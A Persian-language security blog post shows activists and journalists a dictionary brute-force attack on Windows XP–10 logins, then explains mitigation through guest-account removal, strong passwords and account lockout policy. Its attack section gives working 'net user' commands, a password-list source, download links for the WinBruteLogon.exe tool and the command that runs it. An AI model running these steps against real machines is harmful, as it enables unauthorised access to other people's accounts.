+++
title = "امنیت سایبری ۱۰۱ ویژه فعالان حقوق بشر، فعالان مدنی، فعالان سیاسی، روزنامه نگاران و براندازان: اثبات آسیب‌پذیری تازه کشف‌شده در سیستم‌عامل ویندوز مایکروسافت که به هر فردی با دانش ابتدایی کامپیوتر اجازه بدست‌آوردن و هک کلمات عبور از ویندوز XP تا ویندوز ۱۰ را می‌دهد!"
slug = "cybersecurity-101-microsoft-windows-brute-force-login-vulnerability-proof-concept-mitigation"
date = 2020-05-17T19:10:00+02:00
tags = [ "Barandazan", "Cybersecurity", "Iran", "Islamic Republic Of Iran", "Microsoft", "Microsoft Windows", "Proof of Concept", "Security", "Threat Mitigation", "Vulnerability" ]
toc = true
+++

{{< youtube QQ >}}

<br />

در ادامه این مطلب با اثبات آسیب‌پذیری تازه کشف‌شده در سیستم‌عامل ویندوز مایکروسافت که به هر فردی با دانش ابتدایی کامپیوتر اجازه بدست‌آوردن و هک کلمات عبور از ویندوز XP تا ویندوز ۱۰ را می‌دهد، با خطرات این آسیب‌پذیری آشنا خواهیم شد.

لازم به ذکر است که مایکروسافت تا این لحظه واکنشی نسبت به این آسیب‌پذیری و یا رفع آن نشان نداده است. اما در ادامه راهکارهایی را جهت کاهش سطح آسیب‌پذیری تا رفع آن توسط مایکروسافت آموزش خواهیم داد.

جزییات در ادامه مطلب.

<!--more-->

## دستور نمایش تمامی کاربرهای فعلی سیستم

{{< codeblock lang="cmd" >}}
> net user
{{< /codeblock >}}

## دستور تغییر کلمه عبور برای یک کاربر

{{< codeblock lang="cmd" >}}
> net user "Mamadou Babaei" "matrix"
{{< /codeblock >}}

__نکته ۱__: استفاده از علامت <code>"</code> اختیاری است و تنها در صورت وجود کاراکتر فاصله در نام کاربری یا کلمه عبور الزامی است.

__نکته ۲__: جهت اجرای موفقیت آمیز این دستور بایستی <code>cmd.exe</code> یا Windows Command Prompt با سطح دسترسی ادمین با استفاده از گزینه Run as administrator اجرا شود.

## دستور فعال نمودن کاربر مهمان برای ویندوز‌های پیش از ویندوز ۱۰

{{< codeblock lang="cmd" >}}
> net user guest /active:yes
{{< /codeblock >}}

__نکته__: جهت اجرای موفقیت آمیز این دستور لازم است <code>cmd.exe</code> یا Windows Command Prompt با سطح دسترسی ادمین با استفاده از گزینه Run as administrator اجرا شود.

## دستور فعال نمودن کاربر مهمان برای ویندوز‌ ۱۰

روش فوق جهت فعال نمودن کاربر مهمان داخلی ویندوز تا ویندوز ۱۰ نسخه <code>۱۰۱۵۹</code> کار می‌نموده است که پس از آن کاملا توسط مایکروسافت غیرفعال شده است. لذا با دستورات ذیل می‌توانید یک کاربر دیگر با سطح دسترسی مشابه Guest با نام Visitor را ایجاد نمایید:

{{< codeblock lang="cmd" >}}
> net user Visitor /add /active:yes
> net user Visitor *
> net localgroup users Visitor /delete
> net localgroup guests Visitor /add
{{< /codeblock >}}

## دریافت یک فایل دیکشنری پسورد

می‌توانید [تعدادی فایل دیکشنری نمونه را از این آدرس](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials) بدست بیاورید.

## دریافت ابزار موردنیاز

[برای ویندوز‌های ۶۴ بیتی از این آدرس](https://github.com/DarkCoderSc/win-brute-logon/tree/master/Win64/Release) فایل 
[WinBruteLogon.exe](https://raw.githubusercontent.com/DarkCoderSc/win-brute-logon/master/Win64/Release/WinBruteLogon.exe) و [برای ویندوزهای ۳۲ بیتی از این آدرس](https://github.com/DarkCoderSc/win-brute-logon/tree/master/Win32/Release) فایل [WinBruteLogon.exe](https://raw.githubusercontent.com/DarkCoderSc/win-brute-logon/master/Win32/Release/WinBruteLogon.exe) را بدست بیاورید.

## آغاز حمله

{{< codeblock lang="cmd" >}}
> WinBruteLogon.exe -v -u "Mamadou Babaei" -w "10-million-password-list-top-1000000.txt"
{{< /codeblock >}}

__نکته ۱__: استفاده از علامت <code>"</code> اختیاری است و تنها در صورت وجود کاراکتر فاصله در نام کاربری و یا نام فایل دیکشنری الزامی است.

__نکته ۲__: جهت اجرای این دستور نیاز به سطح دسترسی ویژه ادمین نمی‌باشد.

__نکته ۳__: اجرای این دستور بسته به قدرت پردازنده کامپیوتر و تعداد هسته‌های آن و همچنین بزرگی فایل دیکشنری ممکن است از چند ثانیه تا چندین ساعت طول بکشد.

__نکته ۴__: استخراج موفقیت‌آمیز کلمه‌عبور منوط به وجود آن در فایل یا فایل‌های دیکشنری مورد استفاده می‌باشد.

__نکته ۵__: به طور پیش فرض، نام دامنه، مقدار تعیین شده توسط متغیر محیطی <code>%USERDOMAIN%</code> می‌باشد. امکان تعیین یک نام دامنه دلخواه با پارامتر <code>-d</code> وجود دارد.

## کاهش خطر


* در صورت وجود حساب‌های مهمان یا غیرضروری در سیستم آن‌ها را غیرفعال یا حذف نمایید!

{{< codeblock lang="cmd" title="غیرفعال نمودن کاربر مهمان" >}}
> net users Guest /active:no
{{< /codeblock >}}

__هشدار__: دستور ذیل غیرقابل بازگشت می‌باشد و منجر به حذف کاربر و اطلاعاتش از سیستم می‌شود!

{{< codeblock lang="cmd" title="حذف اکانت‌های غیرضروری" >}}
> net users "SomeInactiveUser" /delete
{{< /codeblock >}}

* [وایت‌لیست نمودن نرم‌افزارها](https://web.archive.org/web/20200517181054/https://www.andreafortuna.org/2018/07/11/application-whitelisting-on-critical-windows-systems-useful-or-not/)

* دستور‌العمل‌ها و بهترین روش‌های مربوط به ایجاد یک کلمه‌عبور پیچیده و قوی را دنبال نمایید. آنرا از طریق Group Policy برای تمامی کاربران سیستم یا دامین اعمال نمایید.

* سیاست قفل نمودن اکانت در صورت چندین سعی مکرر ناموفق را فعال نمایید. این قابلیت بصورت پیش‌فرض غیر فعال می‌باشد. لذا با اجرا نمودن دستور <code>secpol.msc</code> به عنوان یکی از کاربران ادمین سیستم و طی مسیر <code>Account Policies > Account Lockout Policy</code> مقدار گزینه <code>Account lockout threshold</code> را با مقدار دلخواه تنظیم نمایید (بین <code>۱</code> تا <code>۹۹۹</code> بار تلاش؛ مقدار پیش‌فرض <code>۰</code> یعنی بی‌نهایت می‌باشد). مثلا اگر مقدار آن را <code>۸</code> تعیین نمایید، پس از <code>۸</code> بار سعی پشت سر هم غیرموفقیت‌آمیز در ورود یا حدس زدن پسورد، اکانت بصورت خودکار توسط ویندوز قفل می‌شود. با تنظیم گزینه <code>Account lockout duration</code> با مقدار دلخواه مدت زمان قفل بودن اکانت را تعیین می‌نمایید (بین <code>۱</code> تا <code>۹۹,۹۹۹</code> دقیقه؛ مقدار <code>۰</code> باعث قفل شدن دائمی اکانت می‌شود و تا زمانیکه یک از مدیران سیستم صراحتا کاربر را از حالت قفل در نیاورد، کاربر در آن وضعیت باقی خواهد ماند). جهت کسب اطلاعات بیشتر و مطالعه سایر گزینه‌ها مانند <code>Reset account lockout counter after</code> و جزییات آن‌ها به [قسمت Account Lockout Policy در مستندات ویندوز](https://web.archive.org/web/20200517184408/https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/account-lockout-policy) مراجعه نمایید.

* سیاست قفل نمودن اکانت در مورد کاربر ادمین اصلی سیستم یا همان <code>Administrator</code> کار نمی‌کند! چنانچه این کاربر فعال می‌باشد و امکان غیرفعال نمودن آنرا ندارید، بهترین خط مشی، تنظیم یک رمز عبور بسیار پیچیده برای این کاربر می‌باشد.
